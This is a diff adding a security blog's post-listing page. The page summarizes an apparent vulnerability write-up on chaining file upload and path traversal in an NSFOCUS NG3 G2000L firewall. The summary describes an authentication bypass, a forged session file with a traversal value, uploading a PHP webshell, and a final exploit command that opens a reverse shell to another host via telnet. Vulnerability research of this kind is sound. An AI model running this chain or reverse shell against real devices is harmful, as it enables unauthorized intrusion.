@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>vuln | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="vuln - CAI dog">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/posts/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://jellyfish-pro.github.io/posts/index.xml">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="vuln" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/posts/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="vuln"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "vuln",
+      "item": "https://jellyfish-pro.github.io/posts/"
+    }
+  ]
+}
+</script>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span class="active">posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a></div>
+  <h1>
+    vuln
+  </h1>
+</header>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞 漏洞介绍 测试环境时在绿盟NG3 G2000L防火墙上进行的，固件版本：V6.0.1.58；引擎版本：V6.0.3.134。
+根据网络上就传的poc信息，该漏洞组合可能广泛存在于绿盟的整个NG系列防火墙上。不过因为防火墙和固件版本不一样，导致最终的发包内容有所区别。
+文件上传漏洞：该漏洞是因为开发时并没有考虑到特殊情况，从而产生漏洞 路径穿越漏洞：该漏洞是因为文件上传漏洞造成的次生漏洞，因为攻击者上传了特殊文件，从而导致攻击者可以控制本不能控制的参数，从而造成路径穿越。 环境复现 对绿盟防火墙环境的复现可以既简单又困难 矛盾文学（雾）
+困难的地方在于，在网络上找不到绿盟防火墙的完整固件。在其官网中也只能找到升级包，而并非完整的固件包。
+但如果能够直接购买到设备，那就会变得特别的简单。
+无法获得底层shell 当然拿到设备后，可以发现该设备有很多账户，但是只有develop账户可以进入最底层的Linux。可这个账户的密码，是根据一套算法实时计算的，只有寻找绿盟客服才能获得密码。
+所以我们只能采取其他方法。
+漏洞分析 文件上传漏洞 这里我们首先使用bp模拟发包：
+这里首先上传了一个名sess_82c13f359d0dd8f51c29d658a9c8ac71的文件，其实通过这个文件名称，我们就可以大概猜到其作用：想要保存一个session对话。
+一般sess打头的文件都是放在*/tmp*目录下，但以防万一，我们还是在代码中找了一下：
+./nsfocus/web/rest4espc/ipsv1/dispatch/v1/device/bugsInfo/resourse.php 通过代码，可以发现上传路径就是*/tmp*。
+同时，在这个文件中还可以看到一个身份判断：
+这里将$token和$contents进行比较，$contents来自*/tmp/token*文件，而$token来自我们GET传输的数据。
+那么我们如何绕过这个验证呢？答案是什么都不做。
+因为如果我们访问的sess文件中没有$contents的值，则php就会将$contents置为空。同时如果我们发包时，不使用GET传递参数，那么php会将$token也置为空。两个值都置空了，那两个值不就相等了？PHP 是最好的语言
+路径穿越漏洞 通过bp的包，我们可以看到，这时的session_id是最开始我们上传的文件名
+那么这个包，是怎么导致路径穿越的呢？根据上面这个包访问的路径：
+./nsfocus/web/apache2/sslvpn/mail/include/header_main.php 可以看到这里包含了一个叫做compose.php的文件，文件本来的意思是读取session中&#34;lang&#34;的值，并将这个值拼接成一个路径。
+但是我们在伪造的sess文件中存入了特殊的&#34;lang&#34;的值：
+lang|s:52:&#34;../../../../../../../../../../../../../../../../tmp/&#34; 为了直观显示被修改后的效果，这里我修改了原文件，使其输出$lang：
+通过这样的方法，我们就控制了$lang的值，从而让PHP文件包含了我们指定文件夹下的compose.php文件
+漏洞利用 通过上面的漏洞分析，我们可以将利用链总结如下：
+上传一个伪造session，使第二个漏洞包含*/tmp下的compose.php*文件。 然后再上传一个含有一句话马的名字为compose.php的文件到*/tmp*下 最后访问header_main.php，触发路径穿越，导致包含到*/tmp下刚刚上传的compose.php*文件。 最后exp 上传第一个包：
+上传第二个包：
+最后触发路径穿越：
+./test2.py 192.168.1.1 &#34;rm /tmp/f; mknod /tmp/f p; /bin/telnet 192.168.1.3 8080 &lt; /tmp/f | /bin/bash &gt;/tmp/f 2&gt;/tmp/f&#34; </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to 绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞" href="https://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="https://jellyfish-pro.github.io/posts/">
+      «&nbsp;Prev&nbsp;
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
